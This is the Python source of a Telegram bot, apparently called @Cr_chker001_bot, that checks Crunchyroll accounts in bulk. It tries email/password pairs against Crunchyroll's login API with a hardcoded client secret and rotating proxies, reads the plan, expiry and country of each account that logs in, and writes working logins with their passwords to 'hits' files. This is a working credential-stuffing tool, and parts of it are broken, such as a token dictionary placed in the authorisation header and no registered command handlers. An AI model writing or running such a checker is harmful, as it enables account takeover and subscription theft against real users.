import os
import asyncio
import uuid
import random
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN is not set!")
    exit(1)

print(f"BOT_TOKEN: {BOT_TOKEN}")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}


class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.proxy_index = 0
        self.countries = {
            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
            "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
            "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
            "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
            "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
            "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
            "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
            "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
            "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
            "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
            "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪",
            "ET": "Ethiopia 🇪🇹", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
            "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
            "GT": "Guatemala 🇬🇹", "HT": "Haiti 🇭🇹", "HN": "Honduras 🇭🇳",
            "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
            "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱",
            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
            "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻",
            "LB": "Lebanon 🇱🇧", "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹",
            "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
            "MA": "Morocco 🇲🇦", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
            "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲",
            "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦", "PE": "Peru 🇵🇪",
            "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
            "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
            "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
            "ZA": "South Africa 🇿🇦", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
            "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼",
            "TH": "Thailand 🇹🇭", "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦",
            "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
            "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "VE": "Venezuela 🇻🇪",
            "VN": "Vietnam 🇻🇳"
        }

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    async def check(self, email, password):
        try:
            device_id = str(uuid.uuid4())
            async with aiohttp.ClientSession() as session:
                proxy = self.get_proxy()
                if proxy:
                    session._default_headers.update({"Proxy": proxy})

                url = "https://beta-api.crunchyroll.com/auth/v1/token"
                headers = {
                    'host': 'beta-api.crunchyroll.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
                }

                data = {
                    'grant_type': 'password',
                    'username': email,
                    'password': password,
                    'scope': 'offline_access',
                    'client_id': 'y2arvjb0h0rgvtizlovy',
                    'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                    'device_type': 'Baron',
                    'device_id': device_id,
                    'device_name': 'Baron'
                }

                async with session.post(url, headers=headers, data=data, timeout=15) as response:
                    response_text = await response.text()

                if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
                    return {'status': 'INVALID', 'email': email}

                if '"access_token"' not in response_text:
                    return {'status': 'INVALID', 'email': email}

                access_token = await response.json()

                headers = {
                    'authorization': f'Bearer {access_token}',
                    'connection': 'Keep-Alive',
                    'host': 'beta-api.crunchyroll.com',
                    'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
                }

                async with session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15) as response:
                    account_data = await response.json()

                email_verified = account_data.get('email_verified', False)
                created = account_data.get('created', '').split('T')[0]
                external_id = account_data.get('external_id')

                async with session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15) as response:
                    products_data = await response.json()

                plan = "Free"
                currency = "N/A"
                subscribable = "False"
                free_trial = "False"

                if 'items' in products_data and len(products_data['items']) > 0:
                    item = products_data['items'][0]
                    plan = item.get('product', {}).get('sku', 'Unknown')
                    currency = item.get('currency_code', 'N/A')
                    subscribable = str(item.get('product', {}).get('is_subscribable', False))
                    free_trial = str(item.get('active_free_trial', False))

                async with session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15) as response:
                    sub_data = await response.json()

                expiry = sub_data.get('next_renewal_date', 'N/A')
                if expiry and 'T' in expiry:
                    expiry = expiry.split('T')[0]

                plan_duration = sub_data.get('cycle_duration', 'N/A')
                is_active = str(sub_data.get('is_active', False))
                country_code = sub_data.get('country_code', 'US')
                country = self.countries.get(country_code, f"{country_code} 🌍")
                is_cancelled = sub_data.get('is_cancelled', False)

                if is_cancelled or subscribable == "False" or "Subscription Not Found" in str(sub_data):
                    status = "FREE"
                elif subscribable == "True":
                    status = "PREMIUM"
                else:
                    status = "FREE"

                return {
                    'status': status,
                    'email': email,
                    'password': password,
                    'email_verified': email_verified,
                    'account_creation_date': created,
                    'plan': plan,
                    'currency': currency,
                    'subscribable': subscribable,
                    'free_trial': free_trial,
                    'expiry': expiry,
                    'plan_duration': plan_duration,
                    'active': is_active,
                    'country': country
                }

        except Exception as e:
            return {'status': 'ERROR', 'email': email}


async def send_result(chat_id, result):
    capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
ACCOUNT CREATION: {result.get('account_creation_date', 'N/A')}
PLAN: {result.get('plan', 'N/A')}
CURRENCY: {result.get('currency', 'N/A')}
SUBSCRIBABLE: {result.get('subscribable', 'N/A')}
FREE TRIAL: {result.get('free_trial', 'N/A')}
EXPIRY: {result.get('expiry', 'N/A')}
PLAN DURATION: {result.get('plan_duration', 'N/A')}
ACTIVE: {result.get('active', 'N/A')}
COUNTRY: {result.get('country', 'N/A')}
CHECKED BY: @Cr_chker001_bot
{'='*70}
"""

    if result['status'] == 'PREMIUM':
        await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(capture + "\n")

    elif result['status'] == 'FREE':
        await bot.send_message(chat_id, f"<b>🆓 FREE HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
        with open("free.txt", "a", encoding="utf-8") as f:   # also saves free accounts
            f.write(capture + "\n")

    else:
        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")


async def main():
    print("Bot is starting...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    print("Starting bot...")
    asyncio.run(main())
